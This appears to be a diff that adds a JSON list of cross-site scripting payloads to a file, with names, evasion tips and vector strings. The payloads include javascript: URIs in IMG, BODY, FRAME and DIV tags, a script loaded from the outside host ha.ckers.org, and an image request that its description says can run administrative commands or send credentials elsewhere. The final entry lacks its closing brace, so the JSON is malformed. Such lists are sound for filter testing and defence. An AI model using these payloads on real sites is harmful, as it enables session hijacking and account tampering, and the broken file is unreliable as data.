@@ -1,1 +1,102 @@
-kentest!
+[
+   {
+      "description" : "Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word \"XSS\" will pop up.  You'll need to replace the \"&\" with \"%26\" if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you're in a rush and need to quickly check a page, often times injecting the deprecated \"<PLAINTEXT>\" tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.",
+      "name" : "XSS Locator",
+      "vector" : "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}"
+   },
+   {
+      "description" : "If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS versus &lt;XSS to see if it is vulnerable.",
+      "name" : "XSS Quick Test",
+      "vector" : "'';!--\"<XSS>=&{()}"
+   },
+   {
+      "description" : "Basic injection attack",
+      "name" : "SCRIPT w/Alert()",
+      "vector" : "<SCRIPT>alert('XSS')</SCRIPT>"
+   },
+   {
+      "description" : "No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).",
+      "name" : "SCRIPT w/Source File",
+      "vector" : "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
+   },
+   {
+      "description" : "Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word \"XSS\" will pop up.",
+      "name" : "SCRIPT w/Char Code",
+      "vector" : "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+   },
+   {
+      "description" : "Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like \"images/image.jpg\" rather than full paths.  If the path includes a leading forward slash like \"/images/image.jpg\" you can remove one slash from this vector (as long as there are two to begin the comment this will work",
+      "name" : "BASE",
+      "vector" : "<BASE HREF=\"javascript:alert('XSS');//\">"
+   },
+   {
+      "description" : "BGSOUND",
+      "name" : "BGSOUND",
+      "vector" : "<BGSOUND SRC=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "BODY image",
+      "name" : "BODY background-image",
+      "vector" : "<BODY BACKGROUND=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "BODY tag (I like this method because it doesn't require using any variants of \"javascript:\" or \"<SCRIPT...\" to accomplish the XSS attack)",
+      "name" : "BODY ONLOAD",
+      "vector" : "<BODY ONLOAD=alert('XSS')>"
+   },
+   {
+      "description" : "Div background-image",
+      "name" : "DIV background-image 1",
+      "vector" : "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"
+   },
+   {
+      "description" : "Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)",
+      "name" : "DIV background-image 2",
+      "vector" : "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">"
+   },
+   {
+      "description" : "Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\"",
+      "name" : "DIV expression",
+      "vector" : "<DIV STYLE=\"width: expression(alert('XSS'));\">"
+   },
+   {
+      "description" : "Frame (Frames have the same sorts of XSS problems as iframes).",
+      "name" : "FRAME",
+      "vector" : "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>"
+   },
+   {
+      "description" : "Iframe (If iframes are allowed there are a lot of other XSS problems as well).",
+      "name" : "IFRAME",
+      "vector" : "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"
+   },
+   {
+      "description" : "INPUT Image",
+      "name" : "INPUT Image",
+      "vector" : "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "Image XSS using the JavaScript directive.",
+      "name" : "IMG w/JavaScript Directive",
+      "vector" : "<IMG SRC=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "No quotes and no semicolon",
+      "name" : "IMG No Quotes/Semicolon",
+      "vector" : "<IMG SRC=javascript:alert('XSS')>"
+   },
+   {
+      "description" : "IMG Dynsrc",
+      "name" : "IMG Dynsrc",
+      "vector" : "<IMG DYNSRC=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "IMG Lowsrc",
+      "name" : "IMG Lowsrc",
+      "vector" : "<IMG LOWSRC=\"javascript:alert('XSS');\">"
+   },
+   {
+      "description" : "This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.",
+      "name" : "IMG Embedded commands 1",
+      "vector" : "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">"
+
+]
